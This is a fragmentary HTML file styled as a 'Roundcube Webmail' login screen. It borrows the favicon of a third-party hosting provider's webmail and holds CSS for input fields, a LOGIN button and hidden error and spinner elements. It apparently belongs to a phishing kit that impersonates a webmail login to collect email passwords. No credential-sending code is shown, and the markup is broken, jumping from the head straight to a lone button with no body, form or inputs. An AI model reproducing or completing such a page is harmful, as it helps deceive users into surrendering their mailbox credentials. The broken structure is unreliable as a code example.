<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="shortcut icon" href="https://webmail.supremecluster.com/skins/elastic/images/favicon.ico?s=1705745704">
    <title>Roundcube Webmail :: Welcome to Roundcube Webmail</title>
    <!-- Font Awesome CDN -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
        }

        body {
            background-color: #21292c;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh; /* Changed to min-height */
            position: relative; /* Added */
        }

        .login-container {
            margin-top: -120px;
            padding: 20px 40px;
            width: 400px;
            text-align: center;
        }

        h1 {
            margin-bottom: 20px;
            color: #333;
        }

        .input-group {
            display: flex;
            align-items: center;
            margin-bottom: 8px;
            border: 1px solid #7c949c;
            border-radius: 5px;
            overflow: hidden;
            background-color: #374549; /* Background color for the left side */
        }

        .input-icon {
            display: flex;
            align-items: center;
            justify-content: center;
            width: 40px;
            background-color: #374549;
            color: #c5d1d3; /* Updated icon color */
        }

        .input-icon i {
            font-size: 16px;
        }

        input[type="text"],
        input[type="password"] {
            flex: 1;
            padding: 10px;
            border: none;
            font-size: 18px;
            background-color: #21292c; /* Match the body's background color */
            color: rgb(224, 221, 221);
            outline: none;
            border-left: 1px solid #7c949c;
            
        }

        input[type="text"]::placeholder,
        input[type="password"]::placeholder {
            color: rgba(255, 255, 255, 0.6);
            font-size: 17px;
        }

        input[type="text"]:focus,
        input[type="password"]:focus {
            box-shadow: 0 0 7px #44bdfa;
            border: 1px solid #37beff;
        }

        .button-container {
            margin-top: 8px; /* Adjust the margin as needed */
            border: 1px solid #37beff; /* Border for the button */
            border-radius: 5px;
            overflow: hidden;
        }

        button {
            width: 100%;
            padding: 5px;
            background-color: #006a9d;
            border: none;
            color: white;
            font-size: 16px;
            cursor: pointer;
        }

        button:hover {
            background-color: #007bb7;
        }

        /* Footer styling */
        footer {
            position: fixed;
            bottom: 0px;
            right: 10px;
        }

        footer img {
            width: 320px;
            height: auto;
        }

        .err {
            display: none;
            z-index: 3;
        }

        .cll {
    display: none;
    align-items: center; /* Center items vertically */
}

.loader-container {
    display: flex;
    align-items: center; /* Center items vertically */
}

.spinner {
    border: 4px solid rgba(0, 0, 0, 0.1);
    border-left-color: #bdc8ca;
    animation: spin 1s linear infinite;
    border-radius: 100%;
    width: 20px;
    height: 20px;
    margin-right: -40px; /* Adjust the margin as needed */
    z-index: 2;
}

@keyframes spin {
    to {
        transform: rotate(360deg);
    }
}


    </style>
</head>

            <div class="button-container">
                <button type="submit">LOGIN</button>
            </div>
